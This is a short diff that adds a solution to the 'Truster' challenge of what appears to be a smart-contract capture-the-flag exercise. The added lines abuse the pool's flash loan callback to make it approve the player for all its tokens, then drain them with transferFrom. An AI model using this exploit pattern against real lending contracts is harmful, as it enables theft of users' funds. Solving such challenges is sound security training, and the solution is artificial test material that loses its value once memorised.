@@ -23,6 +23,11 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const interface = new ethers.utils.Interface(["function approve(address to, uint256 amount)"]);
+        const payload = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+        await pool.flashLoan(0n, player.address, token.address, payload);
+        expect(await token.allowance(pool.address, player.address)).to.equal(TOKENS_IN_POOL);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
